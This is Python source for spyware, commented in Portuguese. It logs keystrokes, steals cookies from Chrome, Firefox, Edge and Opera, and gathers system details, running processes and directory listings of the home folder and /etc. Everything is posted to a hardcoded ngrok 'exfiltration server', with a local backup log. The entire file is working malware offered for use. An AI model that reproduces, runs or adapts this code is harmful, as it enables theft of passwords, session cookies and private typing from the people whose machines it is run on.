import os
import requests
from datetime import datetime
from pynput.keyboard import Listener
import browser_cookie3
import platform
import socket
import uuid
import psutil

# Configurações do servidor de exfiltração
SERVER_URL = "https://c16e-200-103-154-30.ngrok-free.app"

# Configuração do keylogger
BUFFER_SIZE = 50  # Envia dados após 50 teclas armazenadas
buffer = []

# Função para enviar dados ao servidor
def send_data(data_type, data):
    try:
        payload = {
            "timestamp": datetime.now().isoformat(),
            "data_type": data_type,
            "data": data
        }
        response = requests.post(SERVER_URL, json=payload)
        if response.status_code == 200:
            print(f"Enviado com sucesso: {data_type}")
        else:
            print(f"Falha ao enviar {data_type}: {response.status_code}")
    except Exception as e:
        print(f"Erro ao enviar {data_type}: {e}")
        save_local(data_type, data)

# Função para salvar dados localmente (backup)
def save_local(data_type, data):
    timestamp = datetime.now().isoformat()
    with open("backup_log.txt", "a") as file:
        file.write(f"[{timestamp}] {data_type}: {data}\n")

# Função para capturar cookies de vários navegadores
def capture_cookies():
    try:
        cookies = {}

        # Tentar capturar cookies de cada navegador suportado
        try:
            chrome_cookies = browser_cookie3.chrome()
            cookies['Chrome'] = {cookie.name: cookie.value for cookie in chrome_cookies}
        except Exception as e:
            print(f"Erro ao capturar cookies do Chrome: {e}")
        
        try:
            firefox_cookies = browser_cookie3.firefox()
            cookies['Firefox'] = {cookie.name: cookie.value for cookie in firefox_cookies}
        except Exception as e:
            print(f"Erro ao capturar cookies do Firefox: {e}")

        try:
            edge_cookies = browser_cookie3.edge()
            cookies['Edge'] = {cookie.name: cookie.value for cookie in edge_cookies}
        except Exception as e:
            print(f"Erro ao capturar cookies do Edge: {e}")

        try:
            opera_cookies = browser_cookie3.opera()
            cookies['Opera'] = {cookie.name: cookie.value for cookie in opera_cookies}
        except Exception as e:
            print(f"Erro ao capturar cookies do Opera: {e}")

        # Verificar se algum cookie foi capturado
        if cookies:
            print("Cookies capturados com sucesso!")
            send_data("cookies", cookies)  # Enviar ao servidor
        else:
            print("Nenhum cookie encontrado.")
    except Exception as e:
        print(f"Erro ao capturar cookies: {e}")
        save_local("cookies_error", str(e))

# Função para capturar teclas pressionadas
def on_press(key):
    global buffer
    try:
        if hasattr(key, 'char') and key.char is not None:
            buffer.append(key.char)
        elif key == key.space:
            buffer.append(" ")
        elif key == key.enter:
            buffer.append("[ENTER]\n")
        elif key == key.backspace:
            buffer.append("[BACKSPACE]")
        else:
            buffer.append(f"[{key.name}]")

        if len(buffer) >= BUFFER_SIZE:
            send_data("keylogger", "".join(buffer))
            buffer.clear()
    except Exception as e:
        save_local("keylogger_error", str(e))

# Função para capturar informações do sistema
def capture_system_info():
    try:
        info = {
            "username": os.getlogin(),
            "hostname": socket.gethostname(),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "os_name": platform.system(),
            "os_version": platform.version(),
            "os_release": platform.release(),
            "architecture": platform.architecture(),
            "machine": platform.machine(),
            "uuid": str(uuid.uuid4())
        }
        send_data("system_info", info)
    except Exception as e:
        print(f"Erro ao capturar informações do sistema: {e}")
        save_local("system_info_error", str(e))

# Função para capturar informações sobre processos
def capture_process_info():
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent']):
            processes.append(proc.info)
        send_data("process_info", processes)
    except Exception as e:
        print(f"Erro ao capturar informações de processos: {e}")
        save_local("process_info_error", str(e))

# Função para capturar arquivos sensíveis (exemplo com diretórios específicos)
def capture_sensitive_files():
    sensitive_dirs = [os.path.expanduser("~"), "/etc"]
    captured_files = {}
    try:
        for directory in sensitive_dirs:
            if os.path.exists(directory):
                captured_files[directory] = os.listdir(directory)
        send_data("sensitive_files", captured_files)
    except Exception as e:
        print(f"Erro ao capturar arquivos sensíveis: {e}")
        save_local("sensitive_files_error", str(e))

# Função principal
if __name__ == "__main__":
    # Capturar informações iniciais
    capture_system_info()
    capture_cookies()  # Captura de cookies melhorada
    capture_process_info()
    capture_sensitive_files()

    # Iniciar o keylogger
    with Listener(on_press=on_press) as listener:
        listener.join()
